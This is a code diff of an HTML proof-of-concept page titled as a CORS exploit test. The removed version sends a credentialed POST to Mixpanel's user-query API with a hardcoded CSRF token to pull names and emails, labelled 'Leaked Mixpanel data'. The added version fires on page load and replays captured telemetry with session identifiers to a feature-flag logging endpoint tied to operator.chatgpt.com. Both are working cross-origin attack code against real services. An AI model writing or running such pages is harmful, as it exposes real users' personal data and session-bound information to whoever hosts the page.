@@ -2,87 +2,112 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mixpanel CORS PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CORS Exploit Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 2rem;
+      background: #121212;
+      color: #e0e0e0;
+    }
+    pre {
+      background: #222;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    #status {
+      margin-bottom: 1rem;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h1>Mixpanel CORS PoC Test</h1>
-  <button id="runExploit">Run Exploit</button>
+  <h1>CORS Exploit Test</h1>
+  <div id="status">Running test...</div>
+  <pre id="output"></pre>
 
   <script>
-    document.getElementById('runExploit').addEventListener('click', async () => {
+    (async () => {
+      const statusEl = document.getElementById('status');
+      const outputEl = document.getElementById('output');
       try {
-        const response = await fetch("https://mixpanel.com/api/query/engage", {
-          method: "POST",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json",
-            "Authorization": "Session",
-            "X-Csrftoken": "TbM3l35B2a1g76Q5cFdW95c2Nkd1p8A3"
-          },
-          body: JSON.stringify({
-            filter_by_cohort: {
-              raw_cohort: {
-                name: "",
-                id: null,
-                unsavedId: null,
-                groups: [
-                  {
-                    type: "cohort_group",
-                    event: {
-                      resourceType: "cohort",
-                      value: "$all_users",
-                      label: "({t:e})=>e(\"signal.cohort-all-users\")"
-                    },
-                    filters: [
-                      {
-                        filterValue: {
-                          type: "in the last",
-                          window: { unit: "day", value: 7 }
-                        },
-                        resourceType: "user",
-                        propertyDefaultType: "datetime",
-                        propertyName: "$last_seen",
-                        propertyType: "datetime",
-                        filterOperator: "in the last",
-                        propertyObjectKey: null
-                      }
-                    ],
-                    filtersOperator: "and",
-                    behavioralFiltersOperator: "and",
-                    groupingOperator: null,
-                    property: null
-                  }
-                ]
-              }
+        const url = 'https://prodregistryv2.org/v1/rgstr?k=client-tnE5GCU2F2cTxRiMbvTczMDT1jpwIigZHsZSdqiy4u&st=javascript-client-react&sv=3.11.0&t=1754937385410&sid=96d3bbfc-01db-41c4-aacc-d14985303f50&ec=2';
+
+        const payload = {
+          "events":[
+            {
+              "eventName":"statsig::diagnostics",
+              "user":{"statsigEnvironment":{"tier":"production"}},
+              "value":null,
+              "metadata":{
+                "context":"initialize",
+                "markers":[
+                  {"key":"overall","action":"start","timestamp":1754937383634},
+                  {"key":"initialize","action":"start","step":"network_request","timestamp":1754937383639,"attempt":1},
+                  {"key":"initialize","action":"end","step":"network_request","timestamp":1754937384440,"success":true,"statusCode":200,"sdkRegion":null,"isDelta":true,"attempt":1},
+                  {"key":"initialize","action":"start","step":"process","timestamp":1754937384448},
+                  {"key":"initialize","action":"end","step":"process","timestamp":1754937384448,"success":true},
+                  {"key":"overall","action":"end","timestamp":1754937384448,"success":true,"evaluationDetails":{"reason":"Network","lcut":1754937370686,"receivedAt":1754937384446}}
+                ],
+                "statsigOptions":{"environment":{"tier":"production"},"logLevel":4}
+              },
+              "time":1754937384448,
+              "statsigMetadata":{"currentPage":"https://operator.chatgpt.com/"}
             },
-            sort_order: "descending",
-            sort_column: { value: "$last_seen", resourceType: "user" },
-            search: "",
-            columns: [
-              { value: "$name", resourceType: "user", label: "Name", type: "string", propertyDefaultType: "string" },
-              { value: "$email", resourceType: "user", label: "Email", type: "string", propertyDefaultType: "string" },
-              { value: "$last_seen", resourceType: "user" }
-            ],
-            tracking_props: { is_main_query_for_report: true, report_name: "users_sidebar" },
-            project_id: "3828765",
-            include_all_users: false,
-            limit: 6,
-            use_query_sampling: true,
-            workspace_id: "4324524"
-          })
+            {
+              "eventName":"statsig::gate_exposure",
+              "user":{"statsigEnvironment":{"tier":"production"}},
+              "value":null,
+              "metadata":{
+                "gate":"operator-device-verification",
+                "gateValue":"true",
+                "ruleID":"741sv4W86bpimomBwHUWp1:100.00:4",
+                "reason":"Network:Recognized",
+                "lcut":"1754937370686",
+                "receivedAt":"1754937384446"
+              },
+              "secondaryExposures":[],
+              "time":1754937384470,
+              "statsigMetadata":{"currentPage":"https://operator.chatgpt.com/"}
+            }
+          ],
+          "statsigMetadata":{
+            "sdkVersion":"3.11.0",
+            "sdkType":"javascript-client-react",
+            "stableID":"3b7f40e2-3164-4897-b254-6460c0acf2fd",
+            "sessionID":"96d3bbfc-01db-41c4-aacc-d14985303f50",
+            "fallbackUrl":null
+          }
+        };
+
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'text/plain;charset=UTF-8',
+            'Accept': '*/*',
+          },
+          credentials: 'include',
+          body: JSON.stringify(payload),
         });
 
-        if (response.ok) {
-          const data = await response.json();
-          console.log("Leaked Mixpanel data:", data);
-          alert(JSON.stringify(data, null, 2));
-        } else {
-          console.error("Request failed with status", response.status);
+        if (!response.ok) {
+          statusEl.textContent = `HTTP error: ${response.status} ${response.statusText}`;
+          return;
         }
-      } catch (e) {
-        console.error("Fetch error:", e);
+
+        const data = await response.json();
+        statusEl.textContent = 'Request successful! See output below.';
+        outputEl.textContent = JSON.stringify(data, null, 2);
+        console.log('Response from API:', data);
+
+      } catch (err) {
+        statusEl.textContent = 'Fetch error or CORS blocked.';
+        outputEl.textContent = err.toString();
+        console.error('Error:', err);
       }
-    });
+    })();
   </script>
 </body>
 </html>
